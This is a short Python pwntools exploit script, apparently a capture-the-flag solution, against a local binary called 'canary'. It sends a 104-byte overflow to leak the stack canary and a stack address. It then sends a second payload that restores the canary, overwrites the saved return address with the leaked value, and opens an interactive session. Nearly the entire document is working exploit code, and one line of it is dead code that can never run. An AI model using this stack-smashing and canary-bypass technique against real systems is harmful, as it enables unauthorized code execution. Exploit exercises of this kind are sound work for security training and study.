from pwn import *

exe = ELF("./canary")
context.binary = exe

gs = '''
b *main
'''

def conn():
    if args.GDB:
        return gdb.debug(exe.path,gdbscript=gs)
        
    else:
        return process([exe.path])

    return r


p = conn()


payload = b"A" * 104
print(p.recvuntil(": "))
p.sendline(b'5')
print(p.recvuntil(": "))
p.sendline(payload)
p.recvline()

canary = b"\x00" + p.recv(7)

canary = u64(canary)
print(f"Canary: {hex(canary)}")

leak = b"\x00\x00" + p.recv(6)
leak = u64(leak)
print(f"Leak: {hex(leak)}")
print(p.recvuntil(": "))


payload2 = b"A" * 104 + p64(canary) + b"\x90"*8 +p64(leak)

# p.recvline()
p.sendline(payload2)
p.interactive()
